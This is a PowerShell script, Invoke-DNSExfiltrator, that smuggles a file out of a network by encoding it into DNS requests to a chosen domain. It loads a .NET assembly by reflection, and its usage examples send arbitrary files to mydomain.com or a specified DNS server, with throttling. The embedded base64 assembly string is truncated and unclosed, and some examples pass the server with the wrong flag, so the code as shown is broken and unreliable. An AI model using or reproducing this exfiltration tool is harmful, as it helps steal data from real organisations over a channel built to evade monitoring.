function Invoke-DNSExfiltrator
{
	<#
	.AUTHOR Arno0x0x, Twitter: @Arno0x0x
	
	.DESCRIPTION
	Invoke-DNSExfiltrator allows for transfering (exfiltrate) a file over a DNS request covert channel.
    This is basically a data leak testing tool allowing to exfiltrate some data over a covert channel.
	
    It requires the server side counterpart coded in Python: dnsexfiltrator.py.

	.EXAMPLE
    # Using the system's default DNS server, without throttling
	PS C:\> Invoke-DNSExfiltrator -i anyFile -d mydomain.com

    # Using a specific DNS server, without throttling
    PS C:\> Invoke-DNSExfiltrator -i anyFile -d mydomain.com -d 192.168.52.134
	
	# Using a specific DNS server, with throttling
    PS C:\> Invoke-DNSExfiltrator -i anyFile -d mydomain.com -d 192.168.52.134 -t 500

	#>
	
	[CmdletBinding()]
		Param (

		[Parameter(Mandatory = $True)]
		[Alias('i')]
    	[ValidateNotNullOrEmpty()]
    	[String]$InputFile,
		
    	[Parameter(Mandatory = $True)]
		[Alias('d')]
    	[ValidateNotNullOrEmpty()]
    	[String]$DomainName,

        [Parameter(Mandatory = $False)]
		[Alias('s')]
		[ValidateNotNullOrEmpty()]
        [String]$DNSServer,
		
		[Parameter(Mandatory = $False)]
		[Alias('t')]
		[ValidateNotNullOrEmpty()]
        [int]$ThrottleTime
    )
	
	# Load the DNSExfiltrator assembly
    # This is basically a base64 encoded version of the assembly (dnsExfiltrator.dll)
	$DNSExfiltratorLib = [System.Convert]::FromBase64String("
	[System.Reflection.Assembly]::Load($DNSExfiltratorLib) | Out-Null
	
	# Prepare arguments
	$Args = [System.Collections.ArrayList]@()
	$Args.Add($InputFile) | Out-Null
	$Args.Add($DomainName)  | Out-Null
	
	if ($DNSServer) {
		$Args.Add("s=$DNSServer")  | Out-Null
	}
	if ($ThrottleTime) {
		$Args.Add("t=$ThrottleTime") | Out-Null
	}
	
	# Invoke the Main entry point
	[DNSExfiltrator.DNSExfiltrator]::Main($Args)
}